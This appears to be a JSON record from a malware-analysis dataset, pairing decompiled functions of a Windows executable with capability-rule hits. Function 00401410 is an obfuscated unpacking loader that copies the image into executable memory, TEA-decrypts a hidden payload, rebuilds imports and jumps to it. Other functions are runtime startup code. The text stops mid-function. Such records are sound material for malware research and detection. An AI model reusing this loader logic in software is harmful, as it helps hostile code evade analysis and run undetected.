{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\ncode * __cdecl fcn.00401000(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t var_138h;\n    int32_t var_134h;\n    int32_t var_130h;\n    int32_t var_12ch;\n    uint var_127h;\n    uint var_10dh;\n    uint32_t var_b8h;\n    uint32_t var_b4h;\n    uint var_9ch;\n    uint32_t var_28h;\n    uint var_24h;\n    \n    // [00] -r-x section size 24576 named .text\n    var_28h = *arg_ch;\n    var_b8h = arg_ch[1];\n    for (var_12ch = 0; var_12ch < 3; var_12ch = var_12ch + 1) {\n    }\n    (*_sym.imp.KERNEL32.dll_FindClose)(0x3448);\n    var_b4h = 0xc6ef3720;\n    for (var_130h = 0; var_130h < 5; var_130h = var_130h + 1) {\n    }\n    while (var_b4h != 0) {\n        var_b8h = var_b8h - ((var_28h << 4 ^ var_28h >> 5) + (var_28h ^ var_b4h) + *(arg_8h + (var_b4h >> 0xb & 3) * 4))\n        ;\n        var_b4h = var_b4h + 0x61c88647;\n        for (var_134h = 0; var_134h < 3; var_134h = var_134h + 1) {\n        }\n        var_28h = var_28h - ((var_b8h * 0x10 ^ var_b8h >> 5) + (var_b8h ^ var_b4h) + *(arg_8h + (var_b4h & 3) * 4));\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&var_24h);\n    for (var_138h = 0; var_138h < 1; var_138h = var_138h + 1) {\n    }\n    *arg_ch = var_28h;\n    arg_ch[1] = var_b8h;\n    return fcn.00402390;\n}\n",
        "token_count": 540
    },
    "00401410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401eaa)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00401410(void)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    int32_t extraout_ECX;\n    int32_t *piVar6;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    code *pcVar9;\n    uint32_t *extraout_EDX;\n    uint32_t unaff_EBX;\n    code *pcVar10;\n    uint32_t unaff_ESI;\n    int32_t iVar11;\n    code *pcVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    ulong uVar16;\n    uint32_t var_5d8h;\n    int32_t var_5d4h;\n    int32_t var_5d0h;\n    int32_t var_5cch;\n    int32_t var_5c8h;\n    int32_t var_5c4h;\n    uint var_5aeh;\n    uint var_4b4h;\n    int32_t var_430h;\n    int32_t var_42ch;\n    uint var_428h;\n    int32_t *var_424h;\n    int32_t var_420h;\n    int32_t var_41ch;\n    uint32_t var_418h;\n    int32_t var_414h;\n    int32_t var_410h;\n    uint32_t var_40ch;\n    uint32_t var_408h;\n    int32_t var_404h;\n    int32_t var_400h;\n    int32_t var_3fch;\n    code *var_3f8h;\n    uint32_t var_3f4h;\n    int32_t var_3f0h;\n    int32_t var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint32_t var_3e0h;\n    uint32_t *var_3dch;\n    uint var_3d8h;\n    uint var_3a8h;\n    int32_t var_384h;\n    uint32_t *var_380h;\n    code *var_37ch;\n    ushort var_370h;\n    uint var_36eh;\n    uint32_t var_363h;\n    uint32_t var_310h;\n    uint var_30ch;\n    uint var_2e8h;\n    int32_t var_2c4h;\n    int32_t var_2c0h;\n    int32_t var_2bch;\n    int32_t *var_2b8h;\n    ushort var_2b0h;\n    uint var_2aeh;\n    int32_t var_28ch;\n    int32_t var_288h;\n    int32_t *var_284h;\n    uint var_1f8h;\n    uint var_1d4h;\n    code *var_1d0h;\n    uint32_t var_1cch;\n    int32_t var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uchar var_1b4h [3];\n    uint32_t var_1b1h;\n    int32_t *var_1a0h;\n    uint32_t var_19bh;\n    int32_t *var_18ch;\n    code *var_14ch;\n    code *var_148h;\n    uint32_t var_143h;\n    uchar var_f9h;\n    uint var_f8h;\n    int32_t var_118h;\n    code *var_114h;\n    int32_t var_110h;\n    int32_t var_10ch;\n    code *var_108h;\n    int32_t var_104h;\n    uint32_t var_100h;\n    ushort uStack248;\n    code *var_dch;\n    uint var_d8h;\n    int32_t var_c1h;\n    uint *var_4ch;\n    uint32_t var_43h;\n    uint32_t var_3bh;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_363h = (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&var_2e8h);\n    pcVar10 = _sym.imp.KERNEL32.dll_FindClose;\n    var_363h = var_363h & CONCAT22(var_36eh._2_2_, var_36eh);\n    iVar11 = ((unaff_ESI | unaff_EBX) + 0x17) - CONCAT22(var_36eh, var_370h);\n    var_143h = var_143h | var_363h;\n    (*_sym.imp.KERNEL32.dll_FindClose)(0x277e);\n    var_1d0h = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    var_148h = _sym.imp.KERNEL32.dll_GetProcAddress;\n    for (var_3ech = 0; var_3ech < 1; var_3ech = var_3ech + 1) {\n        iVar11 = 0;\n    }\n    var_1c8h = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"kernel32.dll\");\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&var_1f8h);\n    var_f8h._3_1_ = uVar3 >> 8;\n    uStack248 = uVar3 >> 0x10;\n    var_f9h = uVar3;\n    var_f8h._0_2_ = uVar3 >> 8;\n    var_f8h._2_1_ = uVar3 >> 0x18;\n    var_43h = var_43h - uVar3 ^ uVar3 ^ var_3bh;\n    (*_sym.imp.KERNEL32.dll_lstrcpynW)(0, 0, 0x4456);\n    uVar3 = pcVar10 + extraout_ECX * 4 + -0x961b86a & &stack0xfffffffc + iVar11;\n    var_dch = (*var_148h)(var_1c8h, 0x407128);\n    iVar11 = (*_sym.imp.KERNEL32.dll_FindClose)(0x4445);\n    var_c1h = var_c1h - iVar11;\n    for (var_3f0h = 0; var_3f0h < 1; var_3f0h = var_3f0h + 1) {\n        uVar3 = iVar11 + 0x1a;\n        iVar11 = iVar11 << 2;\n    }\n    var_104h = 0x400000;\n    (*_sym.imp.KERNEL32.dll_lstrcpynW)(0, 0, 0x1f04);\n    var_118h = var_104h;\n    iVar11 = var_104h + *(var_104h + 0x3c);\n    var_114h = var_dch;\n    (*var_dch)(var_104h, *(iVar11 + 0x50), 0x40, &var_ch);\n    pcVar10 = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    var_108h = _sym.imp.KERNEL32.dll_VirtualAlloc;\n    var_1a0h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(iVar11 + 0x50), 0x1000, 0x40);\n    pcVar12 = _sym.imp.KERNEL32.dll_GetSystemInfo;\n    var_100h = 0x2260;\n    var_2c0h = 0x590;\n    var_19bh = var_19bh ^ var_1a0h;\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&var_3a8h);\n    var_288h = 0x10000000;\n    var_110h = 0x260;\n    var_10ch = 0x2400;\n    var_2bch = 0x22cc;\n    for (var_3f4h = 0; var_3f4h < *(iVar11 + 0x50); var_3f4h = var_3f4h + 1) {\n        pcVar10 = pcVar10 + 0x1334;\n        uVar3 = 1;\n        *(var_1a0h + var_3f4h) = *(var_104h + var_3f4h);\n        var_3f8h = NULL;\n        pcVar2 = var_1a0h + var_3f4h;\n        pcVar12 = pcVar12 ^ pcVar10;\n        while (pcVar9 = pcVar2,  var_3f8h < 4) {\n            uVar3 = uVar3 * 9;\n            pcVar10 = pcVar10 + 0xdc;\n            var_3f8h = var_3f8h + 1;\n            pcVar2 = var_3f8h;\n            pcVar12 = pcVar9;\n        }\n    }\n    for (var_18ch = var_1a0h; (*var_18ch != 0x3cdd8877 || (var_18ch[1] != 0x4beae776)); var_18ch = var_18ch + 1) {\n    }\n    var_1c4h = 0x502f5ea5;\n    var_1c0h = 0x2e0c646f;\n    var_1bch = 0x1db83b4b;\n    var_1b8h = 0xf3f3ea2;\n    var_2b8h = var_18ch;\n    piVar6 = var_18ch;\n    for (var_3fch = 0; var_3fch < 4; var_3fch = var_3fch + 1) {\n        pcVar10 = 0xfa7e;\n        pcVar12 = ((pcVar12 + uVar3) * 4 + 0xb9 << (piVar6 & 0x1f)) + 0xfa7e;\n        uVar3 = var_18ch + 0x23 >> 5;\n        piVar6 = 0x8231;\n    }\n    for (var_400h = 0; var_400h < 5; var_400h = var_400h + 1) {\n        pcVar10 = pcVar12 << (piVar6 & 0x1f);\n        pcVar12 = 0x7b;\n        uVar3 = 0x18b4;\n    }\n    for (var_404h = 0; var_404h < 4; var_404h = var_404h + 1) {\n    }\n    uVar13 = pcVar12 ^ pcVar10;\n    uVar15 = (uVar3 + 1 & pcVar12) >> 1;\n    uVar3 = 0;\n    for (var_408h = 0; var_408h < var_100h; var_408h = var_408h + 8) {\n        uVar13 = uVar13 + 1;\n        uVar15 = uVar15 + 0x8eba;\n        uVar3 = uVar3 * 0x10 + 0x643b895;\n        uVar16 = fcn.00401000(&var_1c4h, var_2b8h);\n        iVar11 = uVar16 >> 0x20;\n        uVar4 = uVar16;\n        var_40ch = 0;\n        uVar7 = extraout_ECX_00;\n        while (var_40ch < 3) {\n            uVar3 = iVar11 + (uVar3 | uVar4) * 4;\n            uVar4 = uVar4 - 0xeae7 ^ uVar13;\n            uVar13 = (uVar7 + uVar13) * 3;\n            uVar15 = uVar15 * 2 << (uVar4 * '\\x05' & 0x1fU);\n            uVar7 = var_40ch + 1;\n            var_40ch = uVar7;\n        }\n        var_410h = 0;\n        while (var_410h < 5) {\n            uVar7 = uVar7 + iVar11;\n            uVar13 = iVar11 + uVar7;\n            uVar15 = 0x1a;\n            uVar3 = uVar13 + 0x1e << (uVar7 & 0x1f);\n            uVar7 = uVar7 & uVar3;\n            uVar3 = uVar3 * 2;\n            iVar11 = var_410h + 1;\n            var_410h = iVar11;\n        }\n        for (var_414h = 0; var_414h < 1; var_414h = var_414h + 1) {\n            iVar14 = (uVar13 >> 4) * 4;\n            uVar3 = uVar3 & iVar11 * 5;\n            uVar13 = iVar14 + 1;\n            uVar7 = iVar14 + iVar11 * 7;\n            uVar15 = iVar11 * 3;\n        }\n        uVar13 = uVar13 & uVar7;\n        uVar3 = uVar3 >> 1;\n        var_2b8h = var_2b8h + 2;\n    }\n    var_418h = 0;\n    while (var_418h < var_100h) {\n        for (var_41ch = 0; var_41ch < 4; var_41ch = var_41ch + 1) {\n            uVar5 = var_408h;\n            var_408h = 0;\n            uVar15 = (uVar15 >> (uVar5 & 0x1f)) * 4;\n            uVar13 = (uVar3 | 0x3a) + 0xd699;\n            uVar3 = uVar15 + 0xa8;\n        }\n        uVar7 = uVar13 + (var_408h + 0x6a2a380) * 4;\n        piVar6 = var_18ch + (var_418h - var_1a0h);\n        if (*(var_1a0h + piVar6) == 0x11002200) {\n            uVar7 = var_18ch + (var_418h - var_1a0h);\n            *(var_1a0h + uVar7) = var_104h;\n            piVar6 = var_1a0h;\n        }\n        uVar3 = uVar3 & piVar6;\n        iVar11 = (uVar7 * uVar3 * 2 >> 0x20) + uVar3 * 2;\n        iVar14 = ((uVar13 - var_408h) + uVar15 * 4 + 0x1d0 & uVar3) + 1;\n        piVar6 = var_18ch + (var_418h - var_1a0h);\n        if (*(var_1a0h + piVar6) == 0x11002233) {\n            *(var_418h + var_18ch) = var_1a0h;\n            piVar6 = var_1a0h;\n        }\n        piVar8 = var_1a0h;\n        for (var_420h = 0; var_420h < 3; var_420h = var_420h + 1) {\n            piVar6 = (piVar6 >> 3) + 0x6c2e;\n            piVar8 = piVar8 + iVar14 * 3 | uVar3;\n            uVar3 = iVar11 * 9;\n            iVar14 = (iVar14 * 3 + piVar6 * 4) * 4;\n        }\n        uVar3 = piVar8 * 2;\n        uVar13 = 0x93;\n        uVar15 = iVar11 - 0x96d4;\n        var_408h = var_418h + 1;\n        var_418h = var_408h;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindClose)(0x2dcd);\n    iVar11 = CONCAT22(var_2aeh._2_2_, var_2aeh);\n    uVar3 = CONCAT22(var_2aeh, var_2b0h) ^ uVar3;\n    var_2b0h = uVar3;\n    var_2aeh._0_2_ = uVar3 >> 0x10;\n    var_37ch = var_18ch + (var_2c0h - var_110h);\n    var_284h = (var_10ch - var_110h) + var_18ch;\n    var_28ch = var_18ch - var_110h;\n    var_384h = var_28ch - var_288h;\n    var_1d4h = 0xa8;\n    for (var_310h = 0; pcVar10 = _sym.imp.KERNEL32.dll_GlobalSize,  var_310h < 0xa8; var_310h = var_310h + *piVar6) {\n        iVar14 = var_284h[1];\n        var_424h = var_284h + 2;\n        for (var_42ch = 0; var_42ch < iVar14 - 8U >> 1; var_42ch = var_42ch + 1) {\n            if (*var_424h >> 0xc == 3) {\n                *(var_28ch + *var_284h + (*var_424h & 0xfff)) = *(var_28ch + *var_284h + (*var_424h & 0xfff)) + var_384h\n                ;\n            }\n            var_424h = var_424h + 2;\n        }\n        piVar6 = var_284h + 1;\n        var_284h = var_284h + var_284h[1];\n    }\n    iVar14 = (*_sym.imp.KERNEL32.dll_GlobalSize)(0x121);\n    pcVar12 = ((uVar15 & var_3e0h) + iVar11) - iVar14;\n    var_1cch = 0xe3;\n    for (var_430h = 0; var_430h < 0x5e; var_430h = var_430h + 2) {\n        var_1cch = var_1cch / 3;\n    }\n    var_8h = 0;\n    var_3dch = (var_2bch - var_110h) + var_18ch;\n    for (var_380h = var_3dch; var_380h[4] != 0; var_380h = var_380h + 5) {\n        pcVar12 = pcVar12 | var_3dch;\n        (*_sym.imp.KERNEL32.dll_FindClose)(0x1f12);\n        var_1c8h = (*var_1d0h)((var_380h[3] - var_110h) + var_18ch);\n        pcVar10 = _sym.imp.KERNEL32.dll_GlobalSize;\n        (*_sym.imp.KERNEL32.dll_GlobalSize)(0x68cd);\n        var_3dch = extraout_EDX;\n        if (var_1c8h != 0) {\n            if (*var_380h == 0) {\n                var_5d8h = var_380h[4];\n            }\n            else {\n                var_5d8h = *var_380h;\n            }\n            var_4ch = var_28ch + var_380h[4];\n            for (var_3dch = var_28ch + var_5d8h; *var_3dch != 0; var_3dch = var_3dch + 1) {\n                if ((*var_3dch & 0x80000000) == 0) {\n                    var_2c4h = *var_3dch + var_28ch;\n                    var_8h = (*var_148h)(var_1c8h, var_2c4h + 2);\n                    *var_4ch = var_8h;\n                }\n                else {\n                    var_8h = (*var_148h)(var_1c8h, *var_3dch & 0xffff);\n                    *var_4ch = var_8h;\n                }\n                var_5c4h = 0x37f;\n                for (var_5c8h = 0; var_5c8h < 0x28; var_5c8h = var_5c8h + 4) {\n                    if (var_5c4h == 0) {\n                        var_5c4h = 1;\n                    }\n                }\n                var_4ch = var_4ch + 1;\n            }\n        }\n    }\n    stack0xfffffe4c = stack0xfffffe4c & 0xff000000 | var_380h >> 8;\n    _var_1b4h = var_380h;\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&var_30ch);\n    for (var_5cch = 0; var_5cch < 4; var_5cch = var_5cch + 1) {\n        pcVar12 = pcVar10 + pcVar12 * 4;\n    }\n    var_4h = var_37ch;\n    var_14ch = var_37ch;\n    for (var_5d0h = 0; var_5d0h < 5; var_5d0h = var_5d0h + 1) {\n        pcVar12 = pcVar12 + 1;\n    }\n    for (var_5d4h = 0; var_5d4h < 2; var_5d4h = var_5d4h + 1) {\n        pcVar12 = (pcVar12 + 0x70) * 9;\n    }\n    uVar16 = (*var_37ch)();\n    uVar1 = (uVar16 + 3) * ((uVar16 >> 0x20) + 1) * 4;\n    return uVar1 & 0xffffffff | ZEXT48(pcVar12 + (uVar1 >> 0x20)) << 0x20;\n}\n",
        "token_count": 5109
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid entry0(uint32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t unaff_EBP;\n    int32_t unaff_retaddr;\n    uint var_7ch;\n    uint lpStartupInfo;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    int32_t iStack4;\n    \n    iStack4 = 0x60;\n    var_4h = 0x407138;\n    fcn.00403650();\n    fcn.004037b0();\n    *(unaff_EBP + -0x18) = &entry0::var_4h;\n    var_4h = 0x94;\n    iVar4 = unaff_retaddr;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&entry0::var_4h);\n    *0x45e068 = iVar4;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    *0x45e058 = param_2;\n    *0x45e064 = iStack4;\n    *0x45e05c = param_1 & 0x7fff;\n    if (param_2 != 2) {\n        *0x45e05c = *0x45e05c | 0x8000;\n    }\n    *0x45e060 = iStack4 * 0x100 + *0x45e068;\n    piVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    if ((*piVar3 == 0x5a4d) && (piVar6 = *(piVar3 + 0x1e) + piVar3,  *piVar6 == 0x4550)) {\n        if (*(piVar6 + 6) == 0x10b) {\n            if (0xe < piVar6[0x1d]) {\n                iVar4 = piVar6[0x3a];\n                goto code_r0x0040282d;\n            }\n        }\n        else if ((*(piVar6 + 6) == 0x20b) && (0xe < piVar6[0x21])) {\n            iVar4 = piVar6[0x3e];\ncode_r0x0040282d:\n            *(unaff_EBP + -0x1c) = iVar4 != 0;\n            goto code_r0x00402833;\n        }\n    }\n    *(unaff_EBP + -0x1c) = 0;\ncode_r0x00402833:\n    iVar4 = fcn.0040357a(0);\n    if (iVar4 == 0) {\n        if (*0x45e048 == 1) {\n            fcn.00402cba();\n        }\n        fcn.00402b19(0x1c);\n        fcn.00402948(0xff);\n    }\n    fcn.004034d8();\n    *(unaff_EBP + -4) = 0;\n    iVar4 = fcn.0040330a();\n    if (iVar4 < 0) {\n        fcn.004026cd(0x1b);\n    }\n    *0x45e5d4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n    *0x45e040 = fcn.004031e8();\n    iVar4 = fcn.00403146();\n    if (iVar4 < 0) {\n        fcn.004026cd(8);\n    }\n    iVar4 = fcn.00402f13();\n    if (iVar4 < 0) {\n        fcn.004026cd(9);\n    }\n    iVar4 = fcn.004029ae(1);\n    *(unaff_EBP + -0x28) = iVar4;\n    if (iVar4 != 0) {\n        fcn.004026cd(iVar4);\n    }\n    *(unaff_EBP + -0x44) = 0;\n    (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(unaff_EBP + -0x70);\n    uVar5 = fcn.00402eb6();\n    *(unaff_EBP + -0x20) = uVar5;\n    if ((*(unaff_EBP + -0x44) & 1) == 0) {\n        uVar2 = 10;\n    }\n    else {\n        uVar2 = *(unaff_EBP + -0x40);\n    }\n    uVar5 = (*pcVar1)(0, 0, *(unaff_EBP + -0x20), uVar2);\n    uVar5 = fcn.00401410(uVar5);\n    *(unaff_EBP + -0x2c) = uVar5;\n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.00402ad9(uVar5);\n    }\n    fcn.00402afb();\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x80) = 0x402947;\n    fcn.0040368b();\n    return;\n}\n",
        "token_count": 1282
    },
    "00402a18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a18(uint uExitCode, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    code **ppcVar2;\n    bool bVar3;\n    \n    if (*0x45e098 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(uExitCode);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    *0x45e094 = 1;\n    *0x45e090 = arg_10h;\n    if (arg_ch == 0) {\n        if (*0x45e5c8 != NULL) {\n            *0x45e5c4 = *0x45e5c4 + -1;\n            bVar3 = *0x45e5c4 < *0x45e5c8;\n            while (!bVar3) {\n                if (**0x45e5c4 != NULL) {\n                    (***0x45e5c4)();\n                }\n                *0x45e5c4 = *0x45e5c4 + -1;\n                bVar3 = *0x45e5c4 < *0x45e5c8;\n            }\n        }\n        ppcVar2 = 0x40901c;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x409020);\n    }\n    ppcVar2 = 0x409024;\n    do {\n        if (*ppcVar2 != NULL) {\n            (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x409028);\n    if (arg_10h == 0) {\n        *0x45e098 = 1;\n        fcn.00402948(uExitCode);\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "00402b19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00402b19(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uchar auStack272 [260];\n    uchar uStack12;\n    uint uStack8;\n    \n    uStack8 = *0x425b90;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x425a58)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x425a58)) {\n        if ((*0x45e048 == 1) || ((*0x45e048 == 0 && (*0x425a54 == 1)))) {\n            uStack288 = 0;\n            puStack292 = &stack0x00000004;\n            uStack296 = *(uVar1 * 8 + 0x425a5c);\n            uStack296 = fcn.00403be0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack288 = 0x104;\n            puStack292 = &stack0xfffffef0;\n            uStack296 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.004039b0();\n            }\n            iVar2 = fcn.00403be0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.00403be0();\n                fcn.00403ab0();\n            }\n            fcn.00403be0();\n            fcn.00403be0();\n            fcn.004037b0();\n            fcn.004039b0();\n            fcn.004039c0();\n            fcn.004039c0();\n            fcn.004039c0();\n            fcn.004038a9(&stack0xfffffed8, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    uStack288 = 0x402c85;\n    fcn.00403c9c();\n    return;\n}\n",
        "token_count": 542
    },
    "00402d2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d2a(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    \n    uVar2 = *0x45e0a0;\n    piVar4 = 0x425af0;\n    do {\n        if (*piVar4 == arg_8h) break;\n        piVar4 = piVar4 + 3;\n    } while (piVar4 < *0x425b70 * 0xc + 0x425af0U);\n    if ((*0x425b70 * 0xc + 0x425af0U <= piVar4) || (*piVar4 != arg_8h)) {\n        piVar4 = NULL;\n    }\n    if ((piVar4 == NULL) || (pcVar1 = piVar4[2],  pcVar1 == NULL)) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar1 == 0x5) {\n        piVar4[2] = 0;\n        uVar3 = 1;\n    }\n    else {\n        if (pcVar1 != 0x1) {\n            *0x45e0a0 = ExceptionInfo;\n            if (piVar4[1] == 8) {\n                if (*0x425b68 < *0x425b6c + *0x425b68) {\n                    puVar6 = *0x425b68 * 0xc + 0x425af8;\n                    iVar5 = (*0x425b6c + *0x425b68) - *0x425b68;\n                    do {\n                        *puVar6 = 0;\n                        puVar6 = puVar6 + 3;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                }\n                uVar3 = *0x425b74;\n                iVar5 = *piVar4;\n                if (iVar5 == -0x3fffff72) {\n                    *0x425b74 = 0x83;\n                }\n                else if (iVar5 == -0x3fffff70) {\n                    *0x425b74 = 0x81;\n                }\n                else if (iVar5 == -0x3fffff6f) {\n                    *0x425b74 = 0x84;\n                }\n                else if (iVar5 == -0x3fffff6d) {\n                    *0x425b74 = 0x85;\n                }\n                else if (iVar5 == -0x3fffff73) {\n                    *0x425b74 = 0x82;\n                }\n                else if (iVar5 == -0x3fffff71) {\n                    *0x425b74 = 0x86;\n                }\n                else if (iVar5 == -0x3fffff6e) {\n                    *0x425b74 = 0x8a;\n                }\n                (*pcVar1)(8, *0x425b74);\n                *0x425b74 = uVar3;\n            }\n            else {\n                piVar4[2] = 0;\n                (*pcVar1)(piVar4[1]);\n            }\n        }\n        uVar3 = 0xffffffff;\n        *0x45e0a0 = uVar2;\n    }\n    return uVar3;\n}\n",
        "token_count": 779
    },
    "00402fda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fda(uint8_t **arg_8h, int32_t *arg_ch)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t *in_EAX;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint8_t *in_ECX;\n    uint32_t uVar6;\n    int32_t *unaff_ESI;\n    uint var_4h;\n    \n    bVar1 = false;\n    *unaff_ESI = 0;\n    *arg_ch = 1;\n    if (arg_8h != NULL) {\n        *arg_8h = in_ECX;\n        arg_8h = arg_8h + 1;\n    }\n    do {\n        if (*in_EAX == 0x22) {\n            bVar1 = !bVar1;\n            puVar3 = in_EAX + 1;\n            uVar5 = 0x22;\n        }\n        else {\n            *unaff_ESI = *unaff_ESI + 1;\n            if (in_ECX != NULL) {\n                *in_ECX = *in_EAX;\n                in_ECX = in_ECX + 1;\n            }\n            uVar5 = *in_EAX;\n            puVar3 = in_EAX + 1;\n            if ((*(uVar5 + 0x45e281) & 4) != 0) {\n                *unaff_ESI = *unaff_ESI + 1;\n                if (in_ECX != NULL) {\n                    *in_ECX = *puVar3;\n                    in_ECX = in_ECX + 1;\n                }\n                puVar3 = in_EAX + 2;\n            }\n            if (uVar5 == 0) {\n                puVar3 = puVar3 + -1;\n                goto code_r0x00403053;\n            }\n        }\n        in_EAX = puVar3;\n    } while ((bVar1) || ((uVar5 != 0x20 && (uVar5 != 9))));\n    if (in_ECX != NULL) {\n        in_ECX[-1] = 0;\n    }\ncode_r0x00403053:\n    bVar1 = false;\n    while (*puVar3 != 0) {\n        for (; (*puVar3 == 0x20 || (*puVar3 == 9)); puVar3 = puVar3 + 1) {\n        }\n        if (*puVar3 == 0) break;\n        if (arg_8h != NULL) {\n            *arg_8h = in_ECX;\n            arg_8h = arg_8h + 1;\n        }\n        *arg_ch = *arg_ch + 1;\n        while( true ) {\n            bVar2 = true;\n            uVar6 = 0;\n            for (; *puVar3 == 0x5c; puVar3 = puVar3 + 1) {\n                uVar6 = uVar6 + 1;\n            }\n            if (*puVar3 == 0x22) {\n                puVar4 = puVar3;\n                if ((uVar6 & 1) == 0) {\n                    if ((!bVar1) || (puVar4 = puVar3 + 1,  *puVar4 != 0x22)) {\n                        bVar2 = false;\n                        puVar4 = puVar3;\n                    }\n                    bVar1 = !bVar1;\n                }\n                uVar6 = uVar6 >> 1;\n                puVar3 = puVar4;\n            }\n            for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                if (in_ECX != NULL) {\n                    *in_ECX = 0x5c;\n                    in_ECX = in_ECX + 1;\n                }\n                *unaff_ESI = *unaff_ESI + 1;\n            }\n            uVar5 = *puVar3;\n            if ((uVar5 == 0) || ((!bVar1 && ((uVar5 == 0x20 || (uVar5 == 9)))))) break;\n            if (bVar2) {\n                if (in_ECX == NULL) {\n                    if ((*(uVar5 + 0x45e281) & 4) != 0) {\n                        puVar3 = puVar3 + 1;\n                        *unaff_ESI = *unaff_ESI + 1;\n                    }\n                }\n                else {\n                    if ((*(uVar5 + 0x45e281) & 4) != 0) {\n                        *in_ECX = uVar5;\n                        in_ECX = in_ECX + 1;\n                    